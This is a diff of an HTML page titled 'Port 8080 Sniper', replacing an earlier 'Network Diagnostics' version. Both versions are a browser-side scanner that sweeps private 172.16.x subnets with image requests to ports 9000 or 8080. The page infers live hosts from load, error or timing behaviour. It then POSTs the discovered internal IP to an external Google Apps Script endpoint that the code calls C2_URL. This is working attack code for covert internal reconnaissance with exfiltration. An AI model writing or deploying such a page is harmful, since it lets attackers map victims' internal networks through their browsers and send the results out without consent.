@@ -1,180 +1,81 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Network Diagnostics</title>
+    <title>Port 8080 Sniper</title>
     <style>
-        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Consolas', 'Monaco', monospace; padding: 30px; }
-        h1 { border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
-        .status-line { color: #888; font-size: 0.9em; margin-bottom: 5px; }
-        .highlight { color: #fff; font-weight: bold; font-size: 1.1em; }
-        .winner { 
-            border: 2px dashed #00ff00; 
-            padding: 15px; 
-            margin-top: 20px; 
-            background-color: #001100;
-        }
-        #progress-bar { width: 100%; background-color: #333; height: 5px; margin-top: 10px; }
-        #progress-fill { width: 0%; height: 100%; background-color: #00ff00; transition: width 0.2s; }
+        body { background-color: #111; color: #fff; font-family: monospace; padding: 20px; }
+        .success { color: #00ff00; font-weight: bold; font-size: 1.5em; border: 1px solid #00ff00; padding: 10px; margin-top:10px;}
+        .scanning { color: #888; }
     </style>
 </head>
 <body>
-    <h1>// INTERNAL ASSET IDENTIFICATION //</h1>
-    
-    <div id="status-display">
-        <div class="status-line">INITIALIZING TARGETING SCOPE...</div>
-        <div class="status-line">TARGET SUBSETS: 172.16.0.0/24, 172.16.1.0/24</div>
-        <div class="status-line">METHOD: TIMING ANALYSIS (OVERSAMPLING)</div>
-    </div>
-
-    <div id="progress-container" style="margin: 20px 0;">
-        <div id="progress-text">0% COMPLETE</div>
-        <div id="progress-bar"><div id="progress-fill"></div></div>
-    </div>
-
-    <div id="final-report"></div>
+    <h1>// TARGETING PORT 8080 //</h1>
+    <div id="status">Initializing...</div>
+    <div id="results"></div>
 
     <script>
-        // =====================================================================
-        // CONFIGURATION PAYLOAD
-        // =====================================================================
-        // REPLACE THIS WITH YOUR GOOGLE APPS SCRIPT URL
+        // --- CONFIGURATION ---
         var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
         
-        var CONFIG = {
-            subnets: ['172.16.0', '172.16.1'],
-            targetPort: 9000,
-            concurrency: 50 // Batched to avoid browser choking
-        };
+        var subnet = '172.16.0';
+        var targetPort = 8080; 
+        
+        // We stop scanning as soon as we find it
+        var found = false;
+        var pendingProbes = 0;
 
-        var DATA = {
-            start_time: new Date().toISOString(),
-            results: [],
-            total_targets: 0,
-            scanned_count: 0
-        };
+        function reportSuccess(ip) {
+            if(found) return; // Already reported
+            found = true;
 
-        // =====================================================================
-        // CORE FUNCTIONS
-        // =====================================================================
+            var msg = "TARGET CONFIRMED: " + ip;
+            document.getElementById('results').innerHTML = "<div class='success'>" + msg + "</div>";
+            document.getElementById('status').innerText = "SCAN COMPLETE.";
 
-        function updateProgress() {
-            var pct = Math.round((DATA.scanned_count / DATA.total_targets) * 100);
-            document.getElementById('progress-fill').style.width = pct + "%";
-            document.getElementById('progress-text').innerText = "SCANNING SECTOR: " + pct + "% COMPLETE";
-        }
-
-        function reportSuccess(winner) {
-            var reportDiv = document.getElementById('final-report');
-            var html = "<div class='winner'>";
-            html += "<h2 style='margin-top:0'>TARGET IDENTIFIED</h2>";
-            html += "<div>DETECTED IP: <span class='highlight'>" + winner.ip + "</span></div>";
-            html += "<div>RESPONSE TIME: <span class='highlight'>" + winner.duration + "ms</span></div>";
-            html += "<div>CONFIDENCE: <span class='highlight'>HIGH (Timing Outlier)</span></div>";
-            html += "<div style='margin-top:10px; font-size:0.8em; color:#888'>INTELLIGENCE EXFILTRATED TO C2</div>";
-            html += "</div>";
-            
-            // Show top 5 noise candidates for debugging
-            html += "<h3 style='margin-top:30px; border-bottom:1px solid #333'>NOISE FLOOR (Top 5 Rejected)</h3>";
-            for(var i=1; i<6; i++) {
-                if(DATA.results[i]) {
-                    html += "<div class='status-line'>Rejected: " + DATA.results[i].ip + " (" + DATA.results[i].duration + "ms)</div>";
-                }
-            }
-            reportDiv.innerHTML = html;
-        }
-
-        function exfiltrate() {
-            document.getElementById('status-display').innerHTML += "<div class='status-line highlight'>ANALYZING TIMING SIGNATURES...</div>";
-
-            // SORT LOGIC: Descending Duration. 
-            // The Real IP connects (handshake + processing) -> Slower.
-            // Dead IPs reject immediately (RST/ICMP) -> Faster.
-            DATA.results.sort((a, b) => b.duration - a.duration);
-
-            var winner = DATA.results[0]; // The slowest response is our winner
-
-            var payload = {
-                timestamp: new Date().toISOString(),
-                identified_ip: winner.ip,
-                confidence_metric: winner.duration + "ms",
-                raw_data_top_10: DATA.results.slice(0, 10)
-            };
-
+            // Beacon the finding to C2
             fetch(C2_URL, {
                 method: "POST",
                 mode: "no-cors",
                 headers: {"Content-Type": "application/json"},
-                body: JSON.stringify(payload)
-            }).then(() => {
-                reportSuccess(winner);
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    status: "TARGET_ACQUIRED",
+                    ip: ip,
+                    port: targetPort
+                })
             });
         }
 
         function probe(ip) {
-            return new Promise(resolve => {
-                var start = performance.now();
-                var img = new Image();
-                
-                var done = function(status) {
-                    if(img.timer) clearTimeout(img.timer);
-                    var duration = Math.round(performance.now() - start);
-                    
-                    // We only record it. We sort later.
-                    DATA.results.push({ip: ip, duration: duration, status: status});
-                    
-                    DATA.scanned_count++;
-                    updateProgress();
-                    resolve();
-                };
+            pendingProbes++;
+            var img = new Image();
+            
+            // IF IT RESPONDS AT ALL (Load or Error), IT'S ALIVE
+            var onResponse = function() {
+                // We found the service!
+                reportSuccess(ip);
+                pendingProbes--;
+            };
 
-                img.onload = () => done("OPEN");
-                img.onerror = () => done("ERR_CONN"); // This is what we expect from the real IP (Port 9000 open but not image)
+            img.onload = onResponse;
+            img.onerror = onResponse; // <--- This will trigger because "Chrome controller running" is not a valid image
 
-                // Hard timeout - if it takes > 2000ms, it's a blackhole/timeout (Host Down)
-                // We treat this as "0" duration or filter it out, usually. 
-                // Here we just resolve it so queue continues.
-                img.timer = setTimeout(() => {
-                    img.src = ""; // kill
-                    // We log timeouts as -1 so they fall to the bottom of the sort
-                    DATA.results.push({ip: ip, duration: -1, status: "TIMEOUT"}); 
-                    DATA.scanned_count++;
-                    updateProgress();
-                    resolve();
-                }, 1500);
+            // If it times out, it's not our guy
+            setTimeout(function() {
+                img.src = ""; // Kill request
+                pendingProbes--;
+            }, 1500);
 
-                // Cache buster + Request
-                img.src = "http://" + ip + ":" + CONFIG.targetPort + "/favicon.ico?t=" + start;
-            });
+            // Fire!
+            img.src = "http://" + ip + ":" + targetPort + "/favicon.ico?r=" + Math.random();
         }
 
-        // =====================================================================
-        // EXECUTION ENGINE (BATCHED)
-        // =====================================================================
-        async function startEngine() {
-            // 1. Build Target List
-            var targets = [];
-            CONFIG.subnets.forEach(subnet => {
-                for (var i = 1; i < 255; i++) targets.push(subnet + "." + i);
-            });
-            DATA.total_targets = targets.length;
-
-            // 2. Process in chunks to prevent browser lag
-            var chunk = [];
-            for (let i = 0; i < targets.length; i++) {
-                chunk.push(probe(targets[i]));
-                if (chunk.length >= CONFIG.concurrency) {
-                    await Promise.all(chunk);
-                    chunk = [];
-                }
-            }
-            // Finish last chunk
-            if (chunk.length > 0) await Promise.all(chunk);
-
-            // 3. Finish
-            exfiltrate();
+        // --- LAUNCH ---
+        document.getElementById('status').innerText = "Sweeping " + subnet + ".0/24 for Port " + targetPort + "...";
+        
+        for (var i = 1; i < 255; i++) {
+            probe(subnet + '.' + i);
         }
-
-        startEngine();
 
     </script>
 </body>
